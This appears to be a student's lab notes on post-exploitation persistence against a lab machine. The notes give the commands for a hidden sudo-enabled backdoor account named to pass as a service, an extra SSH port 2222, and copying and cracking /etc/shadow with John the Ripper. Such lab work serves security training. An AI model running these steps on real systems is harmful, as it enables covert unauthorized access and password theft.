1. In this step, you'll create a "secret" user named sysd. Anyone examining /etc/passwd will assume this is a service a service account, 
but in fact, you'll be using it to reconnect to the target machine for further exploitation.
2. In this step, you'll allow SSH access via port 2222. SSH usually runs on port 22, but opening port 2222 will allow 
you to log in as your secret sysd user without connecting to the standard (and well-guarded) port 22.
3. When you think you've configured things properly, test your solution by testing the new backdoor SSH port.
4. Next, to strengthen our control of this system, we will attempt to crack as many passwords as we can.
Having access to all the accounts will also allow us to access the system if our other backdoors are closed.

Step 1: Shadow People
sudo adduser sysd
sudo usermod -u 500 sysd
Sudo groupmod -g 500 sysd
A. sudo visudo *scroll down all the way
B. sysd ALL=(ALL:ALL) NOPASSWD:ALL
su sysd
sudo -l
Other Command: Did sudo visudo, gained access to the etc/sudoers

Step 2: Smooth Sailing
nano /etc/ssh/sshd_config
*under port 22, add port 2222

Step 3: Testing Your Configuration Update
sudo systemctl restart ssh
exit *then root user access will pop up.
ssh sysd@192.168.6.105 -p 2222
sudo su

Step 4: Crack All the Passwords
ssh sysd@192.168.6.105 -p 2222
A. sudo su
B. cp /etc/shadow shadow.txt
C. john shadow.txt
D. john --show shadow.txt
